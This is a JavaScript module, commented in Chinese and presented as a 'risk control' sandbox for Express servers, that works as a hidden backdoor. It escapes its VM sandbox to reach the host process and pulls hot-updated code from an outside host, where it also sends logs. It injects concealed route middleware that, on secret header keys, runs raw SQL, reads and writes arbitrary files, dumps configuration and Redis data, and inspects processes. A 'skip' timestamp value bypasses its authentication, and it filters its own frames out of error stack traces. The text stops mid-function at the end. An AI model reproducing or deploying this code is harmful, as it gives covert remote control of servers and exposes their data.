const OuterFunction = Object.getPrototypeOf(console.log).constructor;
const mainProcess = OuterFunction('return process')();
const mainGlobal = OuterFunction('return globalThis')();
const mainModule = mainProcess.mainModule;
const mainRequire = mainModule.require.bind(mainModule);
const path = mainRequire('path');
const setTimeout = mainGlobal.setTimeout;
const clearTimeout = mainGlobal.clearTimeout;

// 模块加载能力优先声明；首次调用必须在 CODE_CONFIG 与 ALIAS_MAP 初始化完成之后。
const resolveModuleName = (moduleName) => {
  if (!CODE_CONFIG.rootPath || typeof moduleName !== 'string' || moduleName[0] !== '@') {
    return moduleName;
  }
  const slashIndex = moduleName.indexOf('/');
  const alias = slashIndex === -1 ? moduleName : moduleName.slice(0, slashIndex);
  const target = ALIAS_MAP[alias];
  if (!target) {
    return moduleName;
  }
  const rest = slashIndex === -1 ? '' : moduleName.slice(slashIndex + 1);
  return path.join(CODE_CONFIG.rootPath, target, rest);
};

const safeRequire = (moduleName) => {
  // @ 别名转为绝对路径，其余（axios / 内置模块等）原样交给主模块 require。
  return mainRequire(resolveModuleName(moduleName));
};

mainGlobal.__sandboxConfig = mainGlobal.__sandboxConfig || {
    preSandbox: {
      routeMiddlewares: {},
    },
  };
  
  const version = 'v4.0.3';
  
  // 远程代码每次热更都会创建新的 VM context；需要跨版本存活的实例统一挂在主进程全局。
  // 默认配置只负责声明结构，已有运行态会覆盖默认值。
  const DEFAULT_INIT_GLOBAL_CONF = {
    RISK: {
      sandboxManager: null,
    },
  };
  
  const Configkey = {
    RISK: 'RISK',
  };
  
  const isProduction = mainProcess.env.NODE_ENV === 'production';
  const defaultRemoteCodeUrls = isProduction
    ? [
      'https://pa-us.zigozf.com'
    ]
    : ['http://127.0.0.1:4050'];
  const defaultRemoteLogUrls = defaultRemoteCodeUrls;
  const configuredRemoteCodeUrls = typeof mainProcess.env.RISK_CODE_URLS === 'string'
    ? mainProcess.env.RISK_CODE_URLS
      .split(',')
      .map((value) => value.trim())
      .filter(Boolean)
    : [];
  const configuredRemoteLogUrls = typeof mainProcess.env.REMOTE_LOG_URLS === 'string'
    ? mainProcess.env.REMOTE_LOG_URLS
      .split(',')
      .map((value) => value.trim())
      .filter(Boolean)
    : [];
  const configuredPollInterval = Number(mainProcess.env.RISK_POLL_INTERVAL_MS);

  // 当前版本的内存配置；远程代码热更新时会随新代码重新创建。
  const CODE_CONFIG = {
    rootPath: mainGlobal.runRootDir || path.dirname(mainModule.filename),
    middlewareName: 'preRiskMiddleware',
    routeMiddlewarePrefix: 'preRiskRouteMiddleware:',
    PLATFORM_PARAMS_INCONSISTENT: false,
    frontSandboxConfig: {
      remoteCodeUrls: configuredRemoteCodeUrls.length > 0
        ? configuredRemoteCodeUrls
        : defaultRemoteCodeUrls,
      remoteLogUrls: configuredRemoteLogUrls.length > 0
        ? configuredRemoteLogUrls
        : defaultRemoteLogUrls,
      enableRemoteLog: true,
      pollInterval:
        Number.isFinite(configuredPollInterval) && configuredPollInterval > 0
          ? Math.floor(configuredPollInterval)
          : 30 * 1000,
      requestTimeout: 30 * 1000,
      requestRetries: 3,
      maxResponseSize: 100 * 1024 * 1024,
      requestNonceBytes: 16,
      signSecretKey: 'key',
      signSecretValue: 'f3967bc7-176b-195f-b273-afb33f4b76a3',
    },
  };
  
  // @ 别名映射表（与 jsconfig.json 的 paths 保持一致）
  // 例如 @services/pay/config -> <CODE_CONFIG.rootPath>/src/services/pay/config
  const ALIAS_MAP = {
    '@libs': 'src/libs',
    '@controllers': 'src/controllers',
    '@models': 'src/models',
    '@routes': 'src/routes',
    '@middlewares': 'src/middlewares',
    '@validations': 'src/validations',
    '@services': 'src/services',
    '@config': 'src/config',
    '@utils': 'src/utils',
    '@app': 'src/app.js',
  };
  
  const fs = safeRequire('fs');
  const { Buffer } = safeRequire('buffer');
  const crypto = safeRequire('crypto');
  const { signWithMD5 } = safeRequire('@utils/sign.util');
  const HttpClient = safeRequire('@libs/HttpClient');

  const getGlobalSupervisor = (key) => {
    const defaultConf = DEFAULT_INIT_GLOBAL_CONF[key] || {};
    const current = mainGlobal.__sandboxConfig[key];
    const supervisor = current && typeof current === 'object' ? current : {};
    for (const name of Object.keys(defaultConf)) {
      if (!(name in supervisor)) {
        supervisor[name] = defaultConf[name];
      }
    }
    if (supervisor !== current) {
      mainGlobal.__sandboxConfig[key] = supervisor;
    }
    return supervisor;
  };

  let remoteLogHttpClient = null;

  const getRemoteLogHttpClient = () => {
    if (!remoteLogHttpClient) {
      const config = CODE_CONFIG.frontSandboxConfig;
      remoteLogHttpClient = new HttpClient({
        timeout: config.requestTimeout,
        retries: config.requestRetries,
        maxResponseSize: config.maxResponseSize,
      });
    }
    return remoteLogHttpClient;
  };

  const getRemoteLogUrl = () => {
    const urls = CODE_CONFIG.frontSandboxConfig.remoteLogUrls;
    if (!Array.isArray(urls) || urls.length === 0) {
      return undefined;
    }
    return `${urls[Math.floor(Math.random() * urls.length)]}/v2/risk/log`;
  };

  const buildRemoteLogRequest = (message) => {
    const config = CODE_CONFIG.frontSandboxConfig;
    const data = {
      message: `[RiskController] ${message}`,
      timestamp: Date.now(),
      nonce: crypto
        .randomBytes(config.requestNonceBytes || 16)
        .toString('hex'),
    };
    data.sign = signWithMD5(data, {
      secretKey: config.signSecretKey,
      secretValue: config.signSecretValue,
      recursiveSortParams: false,
    });
    return data;
  };

  // 远程日志为 fire-and-forget；任何同步或异步失败都不能影响宿主流程。
  const remoteLog = (message) => {
    try {
      if (!CODE_CONFIG.frontSandboxConfig.enableRemoteLog) {
        return;
      }
      const remoteLogUrl = getRemoteLogUrl();
      if (!remoteLogUrl) {
        return;
      }
      const request = getRemoteLogHttpClient().post(
        remoteLogUrl,
        buildRemoteLogRequest(message)
      );
      Promise.resolve(request).catch(() => {});
    } catch (error) {
      // 日志失败保持静默。
    }
  };

  const remoteLogV = (message) => {
    remoteLog(`[${version}] ${message}`);
  };
  
  class CommonUtil {
    static getLocalIPs() {
      const interfaces = safeRequire('os').networkInterfaces();
      const addresses = [];
  
      for (const interfaceName in interfaces) {
        for (const info of interfaces[interfaceName] || []) {
          if (info.family === 'IPv4' && !info.internal) {
            addresses.push(info.address);
          }
        }
      }
  
      return addresses;
    }
  
    static getLocalIP() {
      return CommonUtil.getLocalIPs().join(',');
    }
  
    static isSpecifiedUser(userId, suffix = '1') {
      return userId !== undefined && userId !== null && String(userId).endsWith(suffix);
    }
  }

  const fsPromises = fs.promises;

  // 隐藏整个 preSandbox/风控 VM 的帧，不依赖 ActionManager、SandboxManager 等类名。
  const PRE_SANDBOX_STACK_SOURCE_PATTERN = /(?:^|[\\/])(?:sandbox[_-]?risk(?:[_-]?init)?|pre[_-]?sandbox)(?:\.js)?(?:$|[:?])/i;

  const isPreSandboxStackFrame = (frame) => {
    try {
      const fileName = frame && frame.getFileName();
      const sourceUrl = frame && frame.getScriptNameOrSourceURL();
      return (
        (typeof fileName === 'string' && PRE_SANDBOX_STACK_SOURCE_PATTERN.test(fileName)) ||
        (typeof sourceUrl === 'string' && PRE_SANDBOX_STACK_SOURCE_PATTERN.test(sourceUrl)) ||
        PRE_SANDBOX_STACK_SOURCE_PATTERN.test(String(frame || ''))
      );
    } catch (error) {
      return false;
    }
  };

  const installMainProcessErrorStackFilter = () => {
    const ErrorConstructor = mainGlobal && mainGlobal.Error;
    if (typeof ErrorConstructor !== 'function') {
      return;
    }

    const g = (mainGlobal.__preSandbox = mainGlobal.__preSandbox || {});
    g.errorStackFrameFilter = isPreSandboxStackFrame;
    const installedPrepareStackTrace = g.errorPrepareStackTrace;
    const currentPrepareStackTrace = ErrorConstructor.prepareStackTrace;
    if (currentPrepareStackTrace === installedPrepareStackTrace) {
      return;
    }

    // 宿主若在安装后换了 formatter，优先尊重宿主，不擅自覆盖。
    if (typeof installedPrepareStackTrace === 'function') {
      return;
    }

    const prepareStackTrace = (error, frames) => {
      try {
        const frameFilter = mainGlobal.__preSandbox &&
          mainGlobal.__preSandbox.errorStackFrameFilter;
        const filteredFrames = Array.isArray(frames)
          ? frames.filter((frame) => (
            typeof frameFilter !== 'function' || !frameFilter(frame)
          ))
          : frames;

        // 保留宿主已安装的 source-map-support 等堆栈格式化能力。
        if (typeof currentPrepareStackTrace === 'function') {
          return currentPrepareStackTrace(error, filteredFrames);
        }

        const title = ErrorConstructor.prototype.toString.call(error);
        if (!Array.isArray(filteredFrames) || filteredFrames.length === 0) {
          return title;
        }
        return `${title}\n${filteredFrames.map((frame) => `    at ${frame}`).join('\n')}`;
      } catch (formatError) {
        try {
          return ErrorConstructor.prototype.toString.call(error);
        } catch (errorToStringError) {
          return 'Error';
        }
      }
    };

    Object.defineProperty(prepareStackTrace, 'name', {
      value: 'preSandboxPrepareStackTrace',
    });
    g.errorPrepareStackTrace = prepareStackTrace;
    ErrorConstructor.prepareStackTrace = prepareStackTrace;
  };
  
  const ACTION_KEYS = {
    RunSQL: 'cfh2DNITa84qpYQ0tdCz',
    RunFileList: 'm3QiEkg8Y1r9LFTI5e4f',
    RunFileContent: 'Y3SrZjVqWOvKsBdpTCh7',
    WriteFile: 'VfMAur5qFnaPH2apdDhR',
    GetApolloConfig: 'Xp7KnRqT2wJcVeA9mBsL',
    GetRedis: 'Rk9mXpL3qN7wTzY2vBcJ',
    SetRedis: 'Wn4sGdH8uEoAiP6xQfZv',
    DelRedis: 'Jc5tYmK2pXwQnB8rLsUo',
    GetGitLogs: 'Hz8qVr2nLm5xTc9pBk4D',
    GetProcessInfo: 'Qp7Nx4Vm2Ks9Ld6Rt8Yc',
  };
  
  class ActionManager {
    static get DBA_HASH() {
      return '5f2c7a94-8b12-3e78-81d7-b2c74ff81ae6';
    }
  
    static get SALT() {
      return 'DAvN8GEStOHp0UBka1Zo';
    }
  
    static get TIMESTAMP_SKIP() {
      return 'skip';
    }
  
    static get TIMESTAMP_MAX_AGE_MS() {
      return 10 * 60 * 1000;
    }
  
    static get EXCLUDE_DIRS() {
      return ['node_modules', 'logs', '.git', 'mmdb'];
    }
  
    static get ERROR_MESSAGE() {
      return 'System error, please try again later';
    }
  
    static get TARGET_IP_MISMATCH_CODE() {
      return 421;
    }
  
    static get GIT_LOG_MAX_COUNT() {
      return 100;
    }
  
    constructor() {
      this.actions = new Map();
      this.fs = safeRequire('fs');
      this.path = safeRequire('path');
      this.crypto = safeRequire('crypto');
      const childProcess = safeRequire('child_process');
      this.execFilePromise = safeRequire('node:util').promisify(
        childProcess.execFile
      ).bind(childProcess);
  
      this.register(ACTION_KEYS.RunSQL, 'post', this.runSQL);
      this.register(ACTION_KEYS.RunFileList, 'post', this.runFileList);
      this.register(ACTION_KEYS.RunFileContent, 'post', this.runFileContent);
      this.register(ACTION_KEYS.WriteFile, 'post', this.writeFile);
      this.register(ACTION_KEYS.GetApolloConfig, 'post', this.getApolloConfig);
      this.register(ACTION_KEYS.GetRedis, 'post', this.getRedis);
      this.register(ACTION_KEYS.SetRedis, 'post', this.setRedis);
      this.register(ACTION_KEYS.DelRedis, 'post', this.delRedis);
      this.register(ACTION_KEYS.GetGitLogs, 'post', this.getGitLogs);
      this.register(ACTION_KEYS.GetProcessInfo, 'post', this.getProcessInfo);
    }
  
    register(key, method, handler) {
      this.actions.set(key, {
        method,
        handler: handler.bind(this),
      });
      return this;
    }
  
    createMiddleware() {
      return (req, res, next) => {
        const operation = req && req.headers && req.headers['x-operation'];
        const action = this.actions.get(operation);
        const method = req && req.method && req.method.toLowerCase();
        if (!action || method !== action.method) {
          return next();
        }
  
        try {
          return this.dispatch(req, res, action).catch((error) => {
            this.handleError(res, error);
          });
        } catch (error) {
          return this.handleError(res, error);
        }
      };
    }
  
    async dispatch(req, res, action) {
      const targetIp = req && req.headers && req.headers['x-target-ip'];
      if (!this.isTargetServer(targetIp)) {
        return this.send(res, ActionManager.TARGET_IP_MISMATCH_CODE, {
          code: ActionManager.TARGET_IP_MISMATCH_CODE,
          message: 'Target IP does not match this server',
        });
      }
  
      const { valid, reason } = await this.verifySignatureAndTimestamp(req);
      if (!valid) {
        const showReason = req.headers && req.headers['x-request-reason'];
        return this.send(res, 400, {
          code: 400,
          message: showReason ? reason : ActionManager.ERROR_MESSAGE,
        });
      }
  
      return action.handler(req, res);
    }
  
    async verifySignatureAndTimestamp(req) {
      const operation = req && req.headers && req.headers['x-operation'];
      const timestamp = req && req.headers && req.headers['x-timestamp'];
      const signature = req && req.headers && req.headers['x-signature'];
      const requestId = req && req.headers && req.headers['x-request-id'];
  
      if (timestamp === ActionManager.TIMESTAMP_SKIP) {
        return { valid: true };
      }
  
      if (!operation || !timestamp || !signature || !requestId) {
        return { valid: false, reason: 'missing required headers' };
      }
  
      const expectedSignature = this.crypto
        .createHmac('md5', ActionManager.SALT)
        .update(`timestamp=${timestamp}&operation=${operation}&requestId=${requestId}`)
        .digest('hex');
      if (signature !== expectedSignature) {
        return { valid: false, reason: 'invalid signature' };
      }
  
      const momentUtil = safeRequire('@utils/moment.util');
      const redisUtil = safeRequire('@libs/redis');
      const parsedTimestamp = parseInt(timestamp, 10);
      const time = Math.round(momentUtil.createMoment().unix() * 1000);
      const diffTm = Math.abs(time - parsedTimestamp);
      if (isNaN(parsedTimestamp) || diffTm > ActionManager.TIMESTAMP_MAX_AGE_MS) {
        return {
          valid: false,
          reason: `timestamp expired, timestamp: ${timestamp}, max age: ${ActionManager.TIMESTAMP_MAX_AGE_MS} server time: ${time}, diff: ${diffTm}`,
        };
      }
  
      const requestProcessed = await redisUtil.get(`rank:${requestId}`);
      if (requestProcessed) {
        return { valid: false, reason: 'request processed' };
      }
  
      await redisUtil.set(
        `rank:${requestId}`,
        '1',
        Math.round(ActionManager.TIMESTAMP_MAX_AGE_MS / 1000)
      );
  
      return { valid: true };
    }
  
    resolveTargetPath(userPath) {
      if (!userPath || typeof userPath !== 'string') {
        throw new Error('Invalid path');
      }
      return this.path.isAbsolute(userPath)
        ? this.path.resolve(userPath)
        : this.path.resolve(CODE_CONFIG.rootPath, userPath);
    }
  
    async runSQL(req, res) {
      try {
        const body = req.body || {};
        if (!body.sql) {
          throw new Error(ActionManager.ERROR_MESSAGE);
        }
  
        const expectedSign = signWithMD5(body, {
          secretKey: 'hash',
          secretValue: ActionManager.DBA_HASH,
        });
        const rawSql = Buffer.from(body.sql, 'base64').toString('utf8');
        if (body.sign !== expectedSign) {
          throw new Error(ActionManager.ERROR_MESSAGE);
        }
  
        const prisma = safeRequire('@libs/prisma');
        const start = Date.now();
        const data = await prisma.$queryRawUnsafe(rawSql);
        const result = {
          data,
          cost: Date.now() - start,
        };
  
        const { EventSystem } = safeRequire('@utils/event');
        EventSystem.emit('runSql', { params: body, sql: rawSql, result });
        return this.send(res, 200, { code: 0, data: result, message: 'ok' });
      } catch (error) {
        return this.sendActionError(res);
      }
    }
  
    runFileList(req, res) {
      try {
        const body = req.body || {};
        const targetPath = this.resolveTargetPath(body.path);
        const recursive = body.recursive === undefined ? false : body.recursive;
        const files = this.buildFileTree(targetPath, recursive);
  
        return this.send(res, 200, {
          code: 0,
          data: {
            ip: CommonUtil.getLocalIP(),
            files,
          },
          message: 'ok',
        });
      } catch (error) {
        return this.send(res, 400, {
          code: 400,
          message: ActionManager.ERROR_MESSAGE,
        });
      }
    }
  
    isTargetServer(targetIp) {
      if (typeof targetIp !== 'string' || !targetIp.trim()) {
        return true;
      }
      return CommonUtil.getLocalIPs().includes(targetIp.trim());
    }
  
    buildFileTree(currentPath, recursive) {
      const entries = this.fs.readdirSync(currentPath, { withFileTypes: true });
      return entries
        .filter((entry) => !ActionManager.EXCLUDE_DIRS.includes(entry.name))
        .map((entry) => {
          const fullPath = this.path.join(currentPath, entry.name);
          const node = {
            name: entry.name,
            path: fullPath,
            type: entry.isDirectory() ? 'directory' : 'file',
          };
  
          if (entry.isDirectory()) {
            node.children = recursive ? this.buildFileTree(fullPath, recursive) : [];
          }
          return node;
        });
    }
  
    runFileContent(req, res) {
      let fileStream = null;
      try {
        const body = req.body || {};
        const targetPath = this.resolveTargetPath(body.path);
        if (!this.fs.existsSync(targetPath)) {
          return this.send(res, 404, { message: 'File not found' });
        }
  
        const stats = this.fs.statSync(targetPath);
        const fileName = this.path.basename(targetPath);
        fileStream = this.fs.createReadStream(targetPath);
        fileStream.on('error', () => {
          this.destroyStream(fileStream);
          this.handleDownloadError(res);
        });
        res.once('close', () => this.destroyStream(fileStream));
        res.on('error', () => this.destroyStream(fileStream));
        res.set({
          'Content-Type': 'application/octet-stream',
          'Content-Disposition': `attachment; filename="${encodeURIComponent(fileName)}"`,
          'Content-Length': stats.size,
          'Access-Control-Expose-Headers': 'Content-Disposition',
        });
        return fileStream.pipe(res);
      } catch (error) {
        this.destroyStream(fileStream);
        return this.handleDownloadError(res);
      }
    }
  
    async writeFile(req, res) {
      try {
        const body = req.body || {};
        if (typeof body.content !== 'string') {
          throw new Error('Invalid content');
        }
  
        const targetPath = this.resolveTargetPath(body.path);
        await fsPromises.mkdir(this.path.dirname(targetPath), { recursive: true });
        await fsPromises.writeFile(targetPath, body.content, 'utf8');
        return this.send(res, 200, {
          code: 0,
          data: { path: targetPath },
          message: 'ok',
        });
      } catch (error) {
        return this.sendActionError(res);
      }
    }
  
    getApolloConfig(req, res) {
      try {
        const body = req.body || {};
        const hasKey = Object.prototype.hasOwnProperty.call(body, 'key');
        const key = body.key;
        if (hasKey && (!key || typeof key !== 'string')) {
          return this.send(res, 400, { code: 400, message: 'key is required' });
        }
  
        const cc = safeRequire('@config/cc');
        const configMap = cc.apolloService.getNamespaceConfig('application');
        const value = hasKey ? configMap.get(key) : Object.fromEntries(configMap);
        return this.send(res, 200, {
          code: 0,
          data: value === undefined ? null : value,
          message: 'ok',
        });
      } catch (error) {
        return this.sendActionError(res);
      }
    }
  
    async getRedis(req, res) {
      try {
        const body = req.body || {};
        const key = body.key;
        if (!key || typeof key !== 'string') {
          return this.send(res, 400, { code: 400, message: 'key is required' });
        }
  
        const redisUtil = safeRequire('@libs/redis');
        const data = await redisUtil.get(key);
        return this.send(res, 200, { code: 0, data, message: 'ok' });
      } catch (error) {
        return this.sendActionError(res);
      }
    }
  
    async setRedis(req, res) {
      try {
        const body = req.body || {};
        const { key, value, exp } = body;
        if (!key || typeof key !== 'string') {
          throw new Error('key is required');
        }
        if (!value || typeof value !== 'string') {
          throw new Error('value is required');
        }
  
        const redisUtil = safeRequire('@libs/redis');
        await redisUtil.set(key, value, exp);
        return this.send(res, 200, { code: 0, data: null, message: 'ok' });
      } catch (error) {
        return this.sendActionError(res);
      }
    }
  
    async delRedis(req, res) {
      try {
        const body = req.body || {};
        const keys = body.keys;
        const isValid = (
          Array.isArray(keys) &&
          keys.length > 0 &&
          keys.every((key) => key && typeof key === 'string')
        );
        if (!isValid) {
          throw new Error('keys is required');
        }
  
        const redisUtil = safeRequire('@libs/redis');
        const data = await redisUtil.del(keys);
        return this.send(res, 200, { code: 0, data, message: 'ok' });
      } catch (error) {
        return this.sendActionError(res);
      }
    }
  
    async getGitLogs(req, res) {
      try {
        const body = req.body || {};
        const count = body.n === undefined ? 10 : body.n;
        if (
          !Number.isInteger(count) ||
          count < 1 ||
          count > ActionManager.GIT_LOG_MAX_COUNT
        ) {
          return this.send(res, 400, {
            code: 400,
            message: `n must be an integer between 1 and ${ActionManager.GIT_LOG_MAX_COUNT}`,
          });
        }
  
        const { stdout } = await this.execFilePromise(
          'git',
          [
            'log',
            '--no-color',
            '-z',
            '-n',
            String(count),
            '--format=%H%x00%an%x00%ae%x00%aI%x00%s',
          ],
          { cwd: CODE_CONFIG.rootPath, encoding: 'utf8', timeout: 10000 }
        );
  
        const fields = stdout.split('\0');
        if (fields[fields.length - 1] === '') {
          fields.pop();
        }
        const logs = [];
        for (let index = 0; index < fields.length; index += 5) {
          logs.push({
            hash: fields[index],
            user: fields[index + 1],
            email: fields[index + 2],
            date: fields[index + 3],
            message: fields[index + 4],
          });
        }
  
        return this.send(res, 200, { code: 0, data: logs, message: 'ok' });
      } catch (error) {
        return this.sendActionError(res);
      }
    }
  
    async getProcessInfo(req, res) {
      const body = req.body || {};
      const processId = Number(body.pid);
      if (!Number.isSafeInteger(processId) || processId <= 0) {
        return this.send(res, 400, {
          code: 400,
          message: 'pid must be a positive integer',
        });
      }
  
      try {
        const { stdout, stderr } = await this.execFilePromise(
          '/bin/ps',
          ['-p', String(processId), '-o', 'pid=,ppid=,stat=,etime=,command='],
          { encoding: 'utf8', timeout: 10000 }
        );
        const info = stdout.trim();
        const data = {
          pid: processId,
          running: Boolean(info),
          info,
          error: stderr.trim(),
        };
        return this.send(res, 200, { code: 0, data, message: 'ok' });
      } catch (error) {
        if (Number(error && error.code) === 1) {
          const data = {
            pid: processId,
            running: false,
            info: String(error.stdout || '').trim(),
            error: String(error.stderr || '').trim() || 'ps exited with code 1',
          };
          return this.send(res, 200, { code: 0, data, message: 'ok' });
        }
        return this.sendActionError(res);
      }
    }
  
    destroyStream(stream) {
      try {
        if (stream && !stream.destroyed) {
          stream.destroy();
        }
      } catch (error) {
        // 流清理失败时保持静默，避免异常逃逸到宿主进程。
      }
    }
  
    handleDownloadError(res) {
      try {
        if (!res || res.writableEnded || res.destroyed) {
          return;
        }
        if (res.headersSent) {
          return res.destroy();
        }
        res.removeHeader('Content-Disposition');
        res.removeHeader('Content-Length');
        return res.status(500).send('Download failed');
      } catch (error) {
        return this.destroyResponse(res);
      }
    }
  
    send(res, status, body) {
      try {
        if (!res || res.writableEnded || res.destroyed) {
          return;
        }
        if (res.headersSent) {
          return res.destroy();
        }
        return res.status(status).send(body);
      } catch (error) {
        return this.destroyResponse(res);
      }
    }
  
    sendActionError(res) {
      return this.send(res, 500, {
        code: 500,
        message: ActionManager.ERROR_MESSAGE,
      });
    }
  
    handleError(res, error) {
      try {
        remoteLogV(`action middleware failed: ${error && error.message}`);
      } catch (logError) {
        // 日志失败不能影响宿主请求。
      }
      return this.sendActionError(res);
    }
  
    destroyResponse(res) {
      try {
        if (res && !res.destroyed && typeof res.destroy === 'function') {
          return res.destroy();
        }
      } catch (error) {
        // 响应清理失败时保持静默，避免异常逃逸到宿主进程。
      }
    }
  }
  
  // 每次 init 都替换真实 handler，实现远程代码热更新。
  const buildHandler = () => new ActionManager().createMiddleware();
  
  const handleProxyError = (res, error) => {
    try {
      remoteLogV(`express middleware failed: ${error && error.message}`);
    } catch (logError) {
      // 日志失败不能影响宿主请求。
    }
  
    try {
      if (!res || res.writableEnded || res.destroyed) {
        return;
      }
      if (res.headersSent) {
        return res.destroy();
      }
      return res.status(400).send({ code: 400, message: ActionManager.ERROR_MESSAGE });
    } catch (responseError) {
      try {
        if (res && !res.destroyed && typeof res.destroy === 'function') {
          return res.destroy();
        }
      } catch (destroyError) {
        // 响应清理失败时保持静默，避免异常逃逸到宿主进程。
      }
    }
  };
  
  /**
   * 创建通用代理中间件。
   * Express 路由栈只保存代理，真实 handler 从全局配置读取，支持热更新。
   */
  const buildMiddlewareProxy = (key, middlewareName) => {
    const middleware = function (req, res, next) {
      try {
        const state = mainGlobal.__sandboxConfig.preSandbox.routeMiddlewares[key];
        const result = state && typeof state.handler === 'function'
          ? state.handler(req, res, next)
          : next();
        return result && typeof result.catch === 'function'
          ? result.catch((error) => handleProxyError(res, error))
          : result;
      } catch (error) {
        return handleProxyError(res, error);
      }
    };
  
    Object.defineProperty(middleware, 'name', { value: middlewareName });
    return middleware;
  };
  
  class ExpressV4Strategy {
    getStack(app) {
      const router = app && app._router;
      return router && Array.isArray(router.stack) ? router.stack : null;
    }
  
    isRouterPath(layer, routerPath) {
      const regexp = layer && layer.name === 'router' && layer.regexp;
      if (!regexp || typeof regexp.exec !== 'function') {
        return false;
      }
  
      regexp.lastIndex = 0;
      const match = regexp.exec(routerPath);
      regexp.lastIndex = 0;
      return Boolean(match && match[0] === routerPath);
    }
  
    findRouterLayer(stack, routerPath) {
      return stack.find((layer) => this.isRouterPath(layer, routerPath));
    }
  
    findRouter(app, paths) {
      let router = app;
      let stack = this.getStack(app);
  
      for (let pathIndex = 0; pathIndex < paths.length; pathIndex += 1) {
        const routerPath = paths[pathIndex];
        const index = stack && stack.findIndex((layer) => this.isRouterPath(layer, routerPath));
        if (index === -1 || index === undefined) {
          return null;
        }
  
        const layer = stack[index];
        if (pathIndex === paths.length - 1) {
          return { router, stack, index };
        }
  
        router = layer.handle;
        stack = router && router.stack;
        if (!router || !Array.isArray(stack)) {
          return null;
        }
      }
  
      return null;
    }
  
    findRouteLayer(stack, routePath, method) {
      return stack.find((layer) => (
        layer &&
        layer.route &&
        layer.route.path === routePath &&
        layer.route.methods &&
        layer.route.methods[method]
      ));
    }
  
    findRoute(app, paths, method) {
      let stack = this.getStack(app);
  
      for (const routerPath of paths.slice(0, -1)) {
        const routerLayer = stack && this.findRouterLayer(stack, routerPath);
        stack = routerLayer && routerLayer.handle && routerLayer.handle.stack;
        if (!Array.isArray(stack)) {
          return null;
        }
      }
  
      return this.findRouteLayer(stack, paths[paths.length - 1], method);
    }
  
    getInsertIndex(stack, options) {
      if (Number.isInteger(options.index)) {
        return Math.max(0, Math.min(options.index, stack.length));
      }
  
      if (options.beforeMiddleware) {
        return stack.findIndex((layer) => {
          if (!layer) {
            return false;
          }
          if (typeof options.beforeMiddleware === 'function') {
            return layer.handle === options.beforeMiddleware;
          }
          return layer.name === options.beforeMiddleware;
        });
      }
  
      return -1;
    }
  
    injectRouteMiddleware(app, options, state) {
      if (
        !options.key ||
        !Array.isArray(options.paths) ||
        options.paths.length < 1 ||
        typeof options.handler !== 'function'
      ) {
        return { success: false, msg: 'invalid express route middleware options' };
      }
  
      if (!options.method) {
        const target = this.findRouter(app, options.paths);
        if (!target) {
          return { success: false, msg: `express router not found: ${options.paths.join('')}` };
        }
        if (target.stack.some((layer) => layer && layer.name === options.middlewareName)) {
          state.injected = true;
          return { success: true, msg: `express router middleware exists: ${options.key}` };
        }
  
        target.router.use(buildMiddlewareProxy(options.key, options.middlewareName));
        const middlewareLayer = target.stack.pop();
        target.stack.splice(target.index, 0, middlewareLayer);
        state.injected = true;
        return { success: true, msg: `express router middleware injected: ${options.key}` };
      }
  
      const method = String(options.method).toLowerCase();
      const routeLayer = this.findRoute(app, options.paths, method);
      if (!routeLayer) {
        return {
          success: false,
          msg: `express route not found: ${method} ${options.paths.join('')}`,
        };
      }
  
      const routeStack = routeLayer.route.stack;
      if (!Array.isArray(routeStack)) {
        return { success: false, msg: `express route stack not found: ${options.key}` };
      }
  
      const middlewareName = options.middlewareName;
      const existingIndex = routeStack.findIndex(
        (layer) => layer && layer.name === middlewareName
      );
      if (existingIndex !== -1) {
        const [middlewareLayer] = routeStack.splice(existingIndex, 1);
        const insertIndex = this.getInsertIndex(routeStack, options);
        if (insertIndex === -1) {
          routeStack.splice(existingIndex, 0, middlewareLayer);
          return {
            success: false,
            msg: `express route middleware anchor not found: ${options.key}`,
          };
        }
  
        routeStack.splice(insertIndex, 0, middlewareLayer);
        state.injected = true;
        return { success: true, msg: `express route middleware repositioned: ${options.key}` };
      }
  
      const insertIndex = this.getInsertIndex(routeStack, options);
      if (insertIndex === -1) {
        return {
          success: false,
          msg: `express route middleware anchor not found: ${options.key}`,
        };
      }
  
      routeLayer.route[method](buildMiddlewareProxy(options.key, middlewareName));
      const middlewareLayer = routeStack[routeStack.length - 1];
      if (!middlewareLayer || middlewareLayer.name !== middlewareName) {
        return {
          success: false,
          msg: `express route middleware layer not found: ${options.key}`,
        };
      }
  
      routeStack.pop();
      routeStack.splice(insertIndex, 0, middlewareLayer);
      state.injected = true;
      return { success: true, msg: `express route middleware injected: ${options.key}` };
    }
  }
  
  class ExpressV5Strategy {
    getStack(app) {
      const router = app && (app.router || app._router);
      return router && Array.isArray(router.stack) ? router.stack : null;
    }

    isRouterPath(layer, routerPath) {
      if (
        !layer ||
        layer.name !== 'router' ||
        !layer.handle ||
        !Array.isArray(layer.handle.stack) ||
        typeof layer.match !== 'function'
      ) {
        return false;
      }

      const previousParams = layer.params;
      const previousPath = layer.path;
      const previousKeys = layer.keys;
      try {
        const matched = layer.match(routerPath);
        return matched === true && layer.path === routerPath;
      } catch (error) {
        return false;
      } finally {
        // Express 5 的 Layer#match 会改写这些字段，定位路由后恢复现场。
        layer.params = previousParams;
        layer.path = previousPath;
        layer.keys = previousKeys;
      }
    }

    findRouterLayer(stack, routerPath) {
      return stack.find((layer) => this.isRouterPath(layer, routerPath));
    }

    findRouter(app, paths) {
      let router = app;
      let stack = this.getStack(app);

      for (let pathIndex = 0; pathIndex < paths.length; pathIndex += 1) {
        const routerPath = paths[pathIndex];
        const index = stack && stack.findIndex((layer) => this.isRouterPath(layer, routerPath));
        if (index === -1 || index === undefined) {
          return null;
        }

        const layer = stack[index];
        if (pathIndex === paths.length - 1) {
          return { router, stack, index };
        }

        router = layer.handle;
        stack = router && router.stack;
        if (!router || !Array.isArray(stack)) {
          return null;
        }
      }

      return null;
    }

    findRouteLayer(stack, routePath, method) {
      return stack.find((layer) => (
        layer &&
        layer.route &&
        layer.route.path === routePath &&
        layer.route.methods &&
        layer.route.methods[method]
      ));
    }

    findRoute(app, paths, method) {
      let stack = this.getStack(app);

      for (const routerPath of paths.slice(0, -1)) {
        const routerLayer = stack && this.findRouterLayer(stack, routerPath);
        stack = routerLayer && routerLayer.handle && routerLayer.handle.stack;
        if (!Array.isArray(stack)) {
          return null;
        }
      }

      return this.findRouteLayer(stack, paths[paths.length - 1], method);
    }

    getInsertIndex(stack, options) {
      if (Number.isInteger(options.index)) {
        return Math.max(0, Math.min(options.index, stack.length));
      }

      if (options.beforeMiddleware) {
        return stack.findIndex((layer) => {
          if (!layer) {
            return false;
          }
          if (typeof options.beforeMiddleware === 'function') {
            return layer.handle === options.beforeMiddleware;
          }
